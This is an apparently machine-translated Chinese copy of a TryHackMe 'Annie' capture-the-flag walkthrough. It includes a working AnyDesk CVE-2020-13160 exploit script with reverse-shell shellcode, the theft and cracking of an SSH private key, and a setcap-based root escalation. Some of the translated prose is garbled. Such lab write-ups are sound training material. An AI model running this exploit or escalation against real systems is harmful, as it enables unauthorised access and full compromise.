<html>
<head>
<title>Annie From TryHackme</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackme的安妮</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/annie-from-tryhackme-edfea2b78eb5?source=collection_archive---------0-----------------------#2022-07-07">https://infosecwriteups.com/annie-from-tryhackme-edfea2b78eb5?source=collection_archive---------0-----------------------#2022-07-07</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="76bf" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">远程访问有不同的风格。</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi kf"><img src="../Images/8d3dea1351aed58520e722c716364b26.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UVpbODZvOmCGRzXmSd3lWw.jpeg"/></div></div></figure><p id="f860" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">大家好，我是Hac，今天我们要做的是Annie，这是Tryhackme上的一个“中型”盒子。我认为它的难度是“容易”的，因为你只需要找到一个合适的港口来获得最初的立足点。所以不要浪费任何时间，让我们开始吧。</p><p id="2dc4" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">Nmap扫描</p><pre class="kg kh ki kj gt ln lo lp lq aw lr bi"><span id="3b51" class="ls lt iq lo b gy lu lv l lw lx">root@ip-10-10-98-158:~# sudo nmap -sV -p- 10.10.226.112 -oA nmap --min-rate 1000</span><span id="2b0c" class="ls lt iq lo b gy ly lv l lw lx">Starting Nmap 7.60 ( <a class="ae lz" href="https://nmap.org" rel="noopener ugc nofollow" target="_blank">https://nmap.org</a> ) at 2022-07-06 15:18 BST<br/>Nmap scan report for ip-10-10-226-112.eu-west-1.compute.internal (10.10.226.112)<br/>Host is up (0.00042s latency).<br/>Not shown: 65532 closed ports<br/>PORT      STATE SERVICE         VERSION<br/>22/tcp    open  ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)<br/>7070/tcp  open  ssl/realserver?<br/>40293/tcp open  tcpwrapped<br/>MAC Address: 02:39:05:FF:91:67 (Unknown)<br/>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><span id="49f8" class="ls lt iq lo b gy ly lv l lw lx">Service detection performed. Please report any incorrect results at <a class="ae lz" href="https://nmap.org/submit/" rel="noopener ugc nofollow" target="_blank">https://nmap.org/submit/</a> .<br/>Nmap done: 1 IP address (1 host up) scanned in 150.83 seconds</span></pre><p id="64bc" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我们对端口7070和40293了解不多。所以我在谷歌上快速搜索了一下，发现7070端口通常运行any-desk，这是一个远程访问软件。</p><div class="ma mb gp gr mc md"><a href="https://www.speedguide.net/port.php?port=7070" rel="noopener  ugc nofollow" target="_blank"><div class="me ab fo"><div class="mf ab mg cl cj mh"><h2 class="bd ir gy z fp mi fr fs mj fu fw ip bi translated">端口7070 (tcp/udp)</h2><div class="mk l"><h3 class="bd b gy z fp mi fr fs mj fu fw dk translated">已知端口分配和漏洞7070 tcp real audio real audio any desk远程桌面软件使用TCP端口…</h3></div><div class="ml l"><p class="bd b dl z fp mi fr fs mj fu fw dk translated">www.speedguide.net</p></div></div></div></a></div><p id="3066" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">之后，我搜索了与任何桌面软件相关的漏洞。<strong class="kt ir">CVE-2020–13160</strong>在谷歌搜索中排名第一，所以我想试试看。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi mm"><img src="../Images/0b129f3591586eb630c067364a26b828.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RvALSN1g16ljhX_Poya40Q.png"/></div></div></figure><div class="ma mb gp gr mc md"><a href="https://www.exploit-db.com/exploits/49613" rel="noopener  ugc nofollow" target="_blank"><div class="me ab fo"><div class="mf ab mg cl cj mh"><h2 class="bd ir gy z fp mi fr fs mj fu fw ip bi translated">攻击性安全利用数据库档案</h2><div class="mk l"><h3 class="bd b gy z fp mi fr fs mj fu fw dk translated">AnyDesk 5.5.2 -远程代码执行。CVE-2020-13160。Linux平台的远程利用</h3></div><div class="ml l"><p class="bd b dl z fp mi fr fs mj fu fw dk translated">www.exploit-db.com</p></div></div><div class="mn l"><div class="mo l mp mq mr mn ms kp md"/></div></div></a></div><p id="55cd" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我利用这个漏洞做了一点小小的修改(你需要改变ip地址和外壳代码。</p><pre class="kg kh ki kj gt ln lo lp lq aw lr bi"><span id="e38d" class="ls lt iq lo b gy lu lv l lw lx">#!/usr/bin/env python<br/>import struct<br/>import socket<br/>import sys</span><span id="42b3" class="ls lt iq lo b gy ly lv l lw lx">ip = 'IP address' #change this<br/>port = 50001</span><span id="ae4d" class="ls lt iq lo b gy ly lv l lw lx">def gen_discover_packet(ad_id, os, hn, user, inf, func):<br/>  d  = chr(0x3e)+chr(0xd1)+chr(0x1)<br/>  d += struct.pack('&gt;I', ad_id)<br/>  d += struct.pack('&gt;I', 0)<br/>  d += chr(0x2)+chr(os)<br/>  d += struct.pack('&gt;I', len(hn)) + hn<br/>  d += struct.pack('&gt;I', len(user)) + user<br/>  d += struct.pack('&gt;I', 0)<br/>  d += struct.pack('&gt;I', len(inf)) + inf<br/>  d += chr(0)<br/>  d += struct.pack('&gt;I', len(func)) + func<br/>  d += chr(0x2)+chr(0xc3)+chr(0x51)<br/>  return d</span><span id="7ef1" class="ls lt iq lo b gy ly lv l lw lx">#change this <br/>#msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode<br/>shellcode =  b""<br/>shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"<br/>shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x63\x40\x04"<br/>shellcode += b"\x9d\x65\x60\xc6\xfb\x48\x31\x58\x27\x48\x2d"<br/>shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x09\x69\x5c\x04\x0f"<br/>shellcode += b"\x62\x99\x91\x62\x1e\x0b\x98\x2d\xf7\x8e\x42"<br/>shellcode += b"\x61\x40\x15\xc1\x6f\x6a\xa4\x65\x32\x08\x8d"<br/>shellcode += b"\x7b\x0f\x70\x9c\x91\x49\x18\x0b\x98\x0f\x63"<br/>shellcode += b"\x98\xb3\x9c\x8e\x6e\xbc\x3d\x6f\xc3\x8e\x95"<br/>shellcode += b"\x2a\x3f\xc5\xfc\x28\x7d\xd4\x01\x29\x6a\xb2"<br/>shellcode += b"\x16\x08\xc6\xa8\x2b\xc9\xe3\xcf\x32\x28\x4f"<br/>shellcode += b"\x1d\x6c\x45\x04\x9d\x65\x60\xc6\xfb"</span><span id="031d" class="ls lt iq lo b gy ly lv l lw lx">print('sending payload ...')<br/>p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')<br/>s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br/>s.sendto(p, (ip, port))<br/>s.close()<br/>print('reverse shell should connect within 5 seconds')</span></pre><p id="0c75" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我想知道50001号港口。我们在nmap扫描中没有找到这个端口，我运行了两次nmap，但是没有找到。我再次运行Nmap UDP扫描，我得到了端口。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi mt"><img src="../Images/d1037a0423b1339cdedb61ff0accc474.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iK0XJSDrTkWs5xYvkdIvZw.png"/></div></div></figure><p id="4cee" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">让我们运行我们的利用。确保您已经在利用脚本中进行了适当的更改，并且netcat监听器已打开。</p><p id="ade7" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我得到了贝壳……</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi mu"><img src="../Images/04251939b8f9c002040e3c04af3814d4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VLTzwOcdSf16N-6TwM8E9Q.png"/></div></div></figure><p id="a08b" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">之后我复制了<strong class="kt ir"> /home/annie/的内容。ssh/id_rsa </strong>到我们的本地机器。我试图登录，但我们需要一个密码，我们没有。我用<strong class="kt ir"> ssh2john和约翰</strong>开膛手得到密码短语。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi mv"><img src="../Images/90f726b4a85072d36f826d7fb0f694b3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bBhMQFEQZzTk9iNAWW3S4A.png"/></div></div></figure><p id="080e" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">然后我和约翰一起吃了大麻。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi mw"><img src="../Images/fd77de9ad50f0cb3705b22ba80bc5b4f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aQYG4_IGE14zkIiQ4A4xog.png"/></div></div></figure><p id="11a0" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">现在我们可以ssh到这个盒子中(确保id_rsa文件chmod 600有适当的权限)。</p><p id="2bea" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><strong class="kt ir">是时候将我们的权限提升至根用户了………………。</strong></p><p id="b131" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我们可以使用setcap功能将我们的权限提升到root用户。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi mx"><img src="../Images/372ef08ae6daeb759cf8ca9548ce1776.png" data-original-src="https://miro.medium.com/v2/resize:fit:1206/format:webp/1*_9JLAxiwdrvSEPjZGV-aSA.png"/></div></figure><p id="e934" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><strong class="kt ir">获取根的步骤:- </strong></p><p id="5626" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">1:-将python3复制到/tmp或任何其他目录。</p><pre class="kg kh ki kj gt ln lo lp lq aw lr bi"><span id="d675" class="ls lt iq lo b gy lu lv l lw lx">cp /usr/bin/python3 .</span></pre><p id="8f68" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">2:-启用功能</p><pre class="kg kh ki kj gt ln lo lp lq aw lr bi"><span id="9665" class="ls lt iq lo b gy lu lv l lw lx">$ /sbin/setcap cap_setuid+ep /tmp/python3</span></pre><p id="ca83" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">3:-运行python</p><pre class="kg kh ki kj gt ln lo lp lq aw lr bi"><span id="6b13" class="ls lt iq lo b gy lu lv l lw lx">$ ./python3 -c "import os;os.setuid(0);os.system('/bin/bash')"</span></pre><p id="f48a" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">而且我们终于得到了shell作为root用户！！！！</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi my"><img src="../Images/5c10093100633e555c1a49c8f2faf0aa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oByTbDT4ghEpdod9cnzaNA.png"/></div></div></figure><p id="41dd" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我希望你喜欢这篇文章。如果你有任何问题，你可以通过推特问我<a class="ae lz" href="https://twitter.com/Hac10101" rel="noopener ugc nofollow" target="_blank">https://twitter.com/Hac10101</a></p></div></div>    
</body>
</html>